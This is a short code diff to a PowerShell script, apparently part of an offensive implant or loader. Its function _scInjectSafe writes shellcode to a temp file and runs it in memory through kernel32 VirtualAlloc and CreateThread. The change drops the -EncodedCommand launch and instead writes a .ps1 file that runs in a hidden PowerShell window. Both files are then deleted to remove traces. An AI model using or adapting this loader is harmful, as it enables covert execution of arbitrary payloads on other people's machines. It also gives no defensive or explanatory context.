@@ -218,8 +218,9 @@ function _scInject($shellcode) {
 
 function _scInjectSafe($shellcode, $label) {
     $scPath="$env:TEMP\sc_$label.bin"
+    $psPath="$env:TEMP\sc_$label.ps1"
     [IO.File]::WriteAllBytes($scPath,$shellcode)
-    $scriptBlock = @"
+    $psCode = @"
 `$sc=[IO.File]::ReadAllBytes('$scPath')
 `$size=`$sc.Length
 `$k=Add-Type -MemberDefinition '[DllImport(\"kernel32.dll\")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p); [DllImport(\"kernel32.dll\")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, ref uint t);' -Name 'K' -PassThru
@@ -228,9 +229,10 @@ function _scInjectSafe($shellcode, $label) {
 `$tid=0
 [K]::CreateThread([IntPtr]::Zero,0,`$addr,[IntPtr]::Zero,0,[ref]`$tid)
 Remove-Item '$scPath' -Force
+Remove-Item '$psPath' -Force
 "@
-    $encoded=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptBlock))
-    Start-Process powershell.exe -ArgumentList "-NoP -EncodedCommand $encoded" -WindowStyle Hidden
+    [IO.File]::WriteAllText($psPath,$psCode)
+    Start-Process powershell.exe -ArgumentList "-NoP -W Hidden -File `"$psPath`"" -WindowStyle Hidden
     _log "SC: $label launched via child process"
     return $true
 }
